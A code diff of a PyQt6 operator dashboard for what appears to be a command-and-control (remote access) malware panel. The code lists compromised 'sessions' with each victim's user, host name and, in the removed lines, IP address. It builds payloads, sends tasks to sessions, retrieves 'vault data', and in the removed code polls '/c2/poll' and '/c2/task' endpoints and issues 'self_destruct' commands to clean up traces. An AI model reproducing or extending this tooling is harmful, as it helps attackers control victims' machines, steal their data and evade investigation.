@@ -1,191 +1,141 @@
-# ui/dashboard_window.py
+# ui/dashboard_window.py (Reworked for API Client)
 from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QSplitter, QTableWidget, QVBoxLayout, 
-                             QLabel, QHeaderView, QTableWidgetItem, QMenu, QInputDialog,
+                             QLabel, QHeaderView, QTableWidgetItem,
                              QPushButton)
 from PyQt6.QtCore import Qt, pyqtSignal, QTimer
-from PyQt6.QtGui import QAction, QFont
-import requests, uuid
+from PyQt6.QtGui import QFont
 from .builder_pane import BuilderPane
 from .options_pane import OptionsPane
-from config import RELAY_URL
 
 class DashboardWindow(QWidget):
     build_requested = pyqtSignal(dict)
     sign_out_requested = pyqtSignal()
     setting_changed = pyqtSignal(str, object)
-    session_interact_requested = pyqtSignal(str)
+    session_interact_requested = pyqtSignal(str, dict)
     response_received = pyqtSignal(str, dict)
 
-    def __init__(self, db_manager, username):
+    def __init__(self, api_client, db_manager, username):
         super().__init__()
+        self.api = api_client
         self.db = db_manager
         self.username = username
-        self.sessions = {}
+        self.sessions = {} # This will now store the full vault data
 
         main_layout = QHBoxLayout(self)
         self.splitter = QSplitter(Qt.Orientation.Horizontal)
         main_layout.addWidget(self.splitter)
 
-        self.builder_pane = BuilderPane(db_manager) 
+        self.builder_pane = BuilderPane(self.db)
         self.builder_pane.build_requested.connect(self.build_requested)
         
-        self.sessions_pane = QWidget()
-        sessions_layout = QVBoxLayout(self.sessions_pane)
+        sessions_pane = QWidget()
+        sessions_layout = QVBoxLayout(sessions_pane)
         sessions_layout.setContentsMargins(10,10,10,10)
         sessions_layout.addWidget(QLabel("<h2>SESSIONS</h2>"))
         
         self.session_table = QTableWidget()
-        self.session_table.setColumnCount(6)
-        self.session_table.setHorizontalHeaderLabels(["Status", "User", "Public IP", "Host Name", "Session ID", "Open"])
+        self.session_table.setColumnCount(5)
+        self.session_table.setHorizontalHeaderLabels(["Status", "User", "Host Name", "Session ID", "Open"])
         self.session_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
         self.session_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
         
         header = self.session_table.horizontalHeader()
         header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
-        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)
-        header.resizeSection(0, 120)
-        header.setSectionResizeMode(5, QHeaderView.ResizeMode.Fixed)
-        header.resizeSection(5, 120)
-        header.setStretchLastSection(False)
-        self.splitter.setStretchFactor(1, 2)
+        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed); header.resizeSection(0, 120)
+        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Fixed); header.resizeSection(4, 120)
         
         self.session_table.verticalHeader().setVisible(False)
         self.session_table.setSortingEnabled(True)
-        self.session_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
-        self.session_table.customContextMenuRequested.connect(self.show_session_context_menu)
         
         sessions_layout.addWidget(self.session_table)
         
-        self.options_pane = OptionsPane(db_manager)
+        self.options_pane = OptionsPane(self.db)
         self.options_pane.sign_out_requested.connect(self.sign_out_requested)
-        self.options_pane.sanitize_requested.connect(self.handle_sanitize)
         self.options_pane.setting_changed.connect(self.setting_changed)
-        self.options_pane.panel_reset_requested.connect(self.reset_panel_sizes)
         
-        self.splitter.addWidget(self.builder_pane)
-        self.splitter.addWidget(self.sessions_pane)
-        self.splitter.addWidget(self.options_pane)
-        self.reset_panel_sizes()
+        self.splitter.addWidget(self.builder_pane); self.splitter.addWidget(sessions_pane); self.splitter.addWidget(self.options_pane)
+        self.splitter.setSizes([400, 800, 250])
 
         self.poll_timer = QTimer(self)
-        self.poll_timer.timeout.connect(self.poll_relay)
+        self.poll_timer.timeout.connect(self.poll_for_updates)
         self.start_polling()
 
     def start_polling(self):
-        self.sessions = self.db.load_all_sessions_for_user(self.username)
-        self.update_session_table(self.sessions)
-        self.poll_timer.start(3000)
+        self.load_initial_data()
+        self.poll_timer.start(5000) # Poll every 5 seconds
 
     def stop_polling(self):
         self.poll_timer.stop()
+        
+    def load_initial_data(self):
+        response = self.api.get_all_vault_data(self.username)
+        if response and response.get("success"):
+            self.sessions = response.get("data", {})
+            self.poll_for_updates() # Run once to get initial online status
 
-    def poll_relay(self):
-        try:
-            response = requests.get(f"{RELAY_URL}/c2/poll/{self.username}", timeout=10)
-            if response.status_code == 200:
-                polled_data = response.json()
-                live_data = polled_data.get("sessions", {})
+    def poll_for_updates(self):
+        # Poll for live session statuses
+        live_response = self.api.discover_sessions(self.username)
+        if live_response and 'sessions' in live_response:
+            live_sessions = live_response['sessions']
+            all_sids = set(self.sessions.keys()) | set(live_sessions.keys())
+            
+            needs_update = False
+            for sid in all_sids:
+                current_status = self.sessions.get(sid, {}).get('status', 'Offline')
+                new_status = 'Online' if sid in live_sessions else 'Offline'
+                if current_status != new_status:
+                    if sid not in self.sessions: # A new session we've never seen
+                        self.sessions[sid] = {'metadata': live_sessions[sid]}
+                    self.sessions[sid]['status'] = new_status
+                    needs_update = True
+            
+            if needs_update:
+                self.update_session_table()
+        
+        # Poll for responses for all our sessions
+        for session_id in self.sessions.keys():
+            response_data = self.api.get_responses(self.username, session_id)
+            if response_data and response_data.get("responses"):
+                for res in response_data["responses"]:
+                    self.response_received.emit(session_id, res)
 
-                new_session_state = self.db.load_all_sessions_for_user(self.username)
-                for sid in new_session_state:
-                    new_session_state[sid]['status'] = 'Offline'
-                
-                for session_id, data in live_data.items():
-                    new_session_state[session_id] = data
-                    new_session_state[session_id]['status'] = 'Online'
+    def send_task_from_session(self, session_id, task):
+        self.api.send_task(self.username, session_id, task)
 
-                if new_session_state != self.sessions:
-                    self.sessions = new_session_state
-                    self.db.save_all_sessions_for_user(self.username, self.sessions)
-                    self.update_session_table(self.sessions)
-                    
-                for response_data in polled_data.get("responses", []):
-                    session_id = response_data.get("session_id")
-                    self.response_received.emit(session_id, response_data.get("result", {}))
-        except requests.RequestException:
-            if any(s.get('status') == 'Online' for s in self.sessions.values()):
-                for sid in self.sessions: self.sessions[sid]['status'] = 'Offline'
-                self.update_session_table(self.sessions)
-
-    def send_task(self, session_id, task):
-        try:
-            payload = {"session_id": session_id, "command": task}
-            requests.post(f"{RELAY_URL}/c2/task", json=payload, timeout=10)
-        except requests.RequestException:
-            pass
-
-    def handle_sanitize(self):
-        online_sessions = [sid for sid, data in self.sessions.items() if data.get('status') == 'Online']
-        if online_sessions:
-            self_destruct_command = { "action": "self_destruct", "params": {} }
-            for session_id in online_sessions:
-                self.send_task(session_id, self_destruct_command)
-        self.db.sanitize_all_data(self.username)
-        self.sessions.clear()
-        self.update_session_table({})
-
-    def reset_panel_sizes(self):
-        self.splitter.setSizes([400, 800, 250])
-
-    def update_session_table(self, sessions_data):
+    def update_session_table(self):
         self.session_table.setSortingEnabled(False)
         self.session_table.setRowCount(0)
         
-        small_font = QFont()
-        small_font.setPointSize(9)
-
-        for row, (session_id, data) in enumerate(sessions_data.items()):
+        for row, (session_id, data) in enumerate(self.sessions.items()):
             self.session_table.insertRow(row)
-            
-            # FINAL FIX: Set a fixed row height to prevent rendering glitches and ensure uniform size.
             self.session_table.setRowHeight(row, 55)
 
             status = data.get('status', 'Offline')
-
             status_button = QPushButton(status.upper())
             status_button.setObjectName("StatusButton")
             status_button.setProperty("status", "online" if status == "Online" else "offline")
             status_button.setEnabled(False)
             
-            container = QWidget()
-            layout = QHBoxLayout(container)
-            layout.addWidget(status_button)
-            layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
-            layout.setContentsMargins(5,5,5,5)
+            container = QWidget(); layout = QHBoxLayout(container)
+            layout.addWidget(status_button); layout.setAlignment(Qt.AlignmentFlag.AlignCenter); layout.setContentsMargins(5,5,5,5)
             self.session_table.setCellWidget(row, 0, container)
             
             metadata = data.get('metadata', {})
-            
             user_item = QTableWidgetItem(metadata.get('user', 'N/A'))
-            ip_item = QTableWidgetItem(metadata.get('ip', 'N/A'))
             hostname_item = QTableWidgetItem(metadata.get('hostname', 'N/A'))
             session_id_item = QTableWidgetItem(session_id)
-
-            user_item.setFont(small_font)
-            ip_item.setFont(small_font)
-            hostname_item.setFont(small_font)
             
-            items_to_set = [user_item, ip_item, hostname_item, session_id_item]
-            for col_index, item in enumerate(items_to_set, start=1):
+            for item in [user_item, hostname_item, session_id_item]:
                 item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
-                self.session_table.setItem(row, col_index, item)
+            
+            self.session_table.setItem(row, 1, user_item)
+            self.session_table.setItem(row, 2, hostname_item)
+            self.session_table.setItem(row, 3, session_id_item)
             
             interact_button = QPushButton("Interact")
             interact_button.setObjectName("InteractButton")
-            interact_button.clicked.connect(lambda checked, sid=session_id: self.session_interact_requested.emit(sid))
-            self.session_table.setCellWidget(row, 5, interact_button)
+            interact_button.clicked.connect(lambda chk, sid=session_id: self.session_interact_requested.emit(sid, self.sessions.get(sid, {})))
+            self.session_table.setCellWidget(row, 4, interact_button)
         
         self.session_table.setSortingEnabled(True)
-
-    def show_session_context_menu(self, pos):
-        item = self.session_table.itemAt(pos)
-        if not item: return
-        session_id = self.session_table.item(item.row(), 4).text()
-        menu = QMenu()
-        popup_action = menu.addAction("Send Popup Message")
-        action = menu.exec(self.session_table.mapToGlobal(pos))
-        if action == popup_action:
-            text, ok = QInputDialog.getText(self, 'Send Popup', 'Enter message:')
-            if ok and text:
-                command = { "action": "popup", "params": {"title": "Message from C2", "message": text} }
-                self.send_task(session_id, command)
